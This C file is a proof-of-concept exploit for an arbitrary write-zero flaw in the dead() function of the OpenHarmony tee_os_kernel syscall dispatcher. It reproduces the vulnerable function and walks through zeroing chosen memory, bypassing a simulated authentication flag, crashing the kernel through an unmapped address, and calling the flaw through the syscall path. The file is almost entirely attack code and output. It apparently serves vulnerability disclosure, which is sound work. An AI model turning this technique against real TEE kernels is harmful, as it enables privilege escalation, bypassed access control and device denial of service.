/**
 * PoC: Arbitrary Write-Zero via dead() (syscall_dispatcher.c:933)
 * OpenHarmony tee_os_kernel
 *
 * The dead() function dereferences the syscall number as a pointer and writes
 * zero to it. A malicious TA can pass an arbitrary address as the syscall
 * number, achieving write-zero to any mapped address in the TEE kernel.
 *
 * Build: gcc -o poc poc.c -O2
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <stdint.h>

static sigjmp_buf jump_buf;
static volatile int signal_caught = 0;

/* Signal handler to catch SIGSEGV from the write */
static void segv_handler(int sig)
{
    signal_caught = 1;
    siglongjmp(jump_buf, 1);
}

/*
 * Exact reproduction of the vulnerable dead() from syscall_dispatcher.c:933
 * In the real TEE kernel, 'n' comes directly from the TA's syscall invocation.
 */
void dead(long n)
{
    printf("Unsupported syscall %ld, bye.\n", n);
    volatile int *addr = (int *)n;
    *addr = 0;  /* Arbitrary write-zero! Address controlled by attacker. */
}

/*
 * Simulates __syscall6 dispatcher calling dead() for unrecognized syscall.
 * In the real kernel, the TA invokes SVC/HVC with a syscall number in a
 * register. If the number isn't in the valid range, dead() is called with
 * that raw register value.
 */
void __syscall6(long syscall_num, long a1, long a2, long a3, long a4, long a5)
{
    /* Simplified dispatcher - in reality there's a switch/table lookup */
    switch (syscall_num) {
        case 0: /* SYS_read */
        case 1: /* SYS_write */
        case 2: /* SYS_open */
            printf("Valid syscall %ld dispatched normally.\n", syscall_num);
            break;
        default:
            /* Unsupported syscall -> dead() with the raw number */
            dead(syscall_num);
            break;
    }
}

int main(void)
{
    printf("=== PoC: Arbitrary Write-Zero via dead() (syscall_dispatcher.c:933) ===\n");
    printf("OpenHarmony tee_os_kernel\n\n");

    /*
     * Demonstration 1: Write-zero to a controlled heap address
     * Simulates a TA passing a heap address as syscall number.
     */
    printf("[Test 1] Write-zero to heap variable via crafted syscall number\n");

    int *target = malloc(sizeof(int));
    if (!target) {
        perror("malloc");
        return 1;
    }
    *target = 0x41414141;  /* Sensitive value - e.g., permission flags */

    printf("  Before: *target = 0x%08X (at %p)\n", *target, (void *)target);
    printf("  Calling dead() with n = %p (address of target)...\n", (void *)target);

    /* The syscall number IS the address we want to zero */
    dead((long)target);

    printf("  After:  *target = 0x%08X\n", *target);

    if (*target == 0) {
        printf("  [VULNERABLE] Successfully wrote zero to arbitrary address!\n\n");
    } else {
        printf("  [ERROR] Unexpected value.\n\n");
        free(target);
        return 1;
    }
    free(target);

    /*
     * Demonstration 2: Overwrite a security-critical flag
     * Simulates zeroing a permission/authentication check variable.
     */
    printf("[Test 2] Overwrite security flag (simulated auth bypass)\n");

    volatile int auth_required = 1;  /* 1 = authentication required */
    printf("  auth_required = %d (authentication enforced)\n", auth_required);
    printf("  Malicious TA passes &auth_required as syscall number...\n");

    dead((long)&auth_required);

    printf("  auth_required = %d ", auth_required);
    if (auth_required == 0) {
        printf("(authentication BYPASSED!)\n\n");
    }

    /*
     * Demonstration 3: Show that unmapped addresses cause crash
     * (DoS vector - TA can crash the TEE kernel)
     */
    printf("[Test 3] DoS via write to unmapped address\n");

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = segv_handler;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);

    printf("  Calling dead(0xDEAD0000) - unmapped address...\n");

    if (sigsetjmp(jump_buf, 1) == 0) {
        dead(0xDEAD0000L);
        printf("  [UNEXPECTED] No crash.\n");
    } else {
        printf("  [CRASH] SIGSEGV caught! TEE kernel would panic here.\n");
        printf("  In real hardware: Secure Monitor abort -> device reboot.\n\n");
    }

    /*
     * Demonstration 4: Full attack via __syscall6 interface
     * Shows the actual entry point a TA would use.
     */
    printf("[Test 4] Full path: malicious TA -> __syscall6 -> dead()\n");

    int *victim = malloc(sizeof(int));
    *victim = 0x00FACADE;  /* Simulated security token */
    printf("  Security token at %p = 0x%08X\n", (void *)victim, *victim);
    printf("  TA invokes syscall with number = %p...\n", (void *)victim);

    /* TA passes the address as syscall number through SVC interface */
    __syscall6((long)victim, 0, 0, 0, 0, 0);

    printf("  Security token now = 0x%08X\n", *victim);
    if (*victim == 0) {
        printf("  [VULNERABLE] Token zeroed via unsupported syscall path!\n");
    }
    free(victim);

    printf("\n=== Summary ===\n");
    printf("The dead() function treats the syscall number as a pointer and\n");
    printf("writes zero to it. A malicious TA can:\n");
    printf("  1. Write zero to ANY mapped address in TEE kernel space\n");
    printf("  2. Zero out security flags to bypass access control\n");
    printf("  3. Crash the TEE kernel by targeting unmapped addresses (DoS)\n");
    printf("  4. Corrupt kernel data structures for privilege escalation\n");

    return 0;
}
